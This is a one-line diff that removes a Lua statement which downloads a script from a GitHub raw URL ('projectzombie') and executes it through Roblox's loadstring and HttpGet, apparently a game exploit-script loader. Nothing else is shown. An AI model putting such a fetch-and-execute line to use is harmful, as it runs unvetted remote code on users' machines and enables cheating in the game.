@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartModBoy/script2/main/projectzombie", true))()
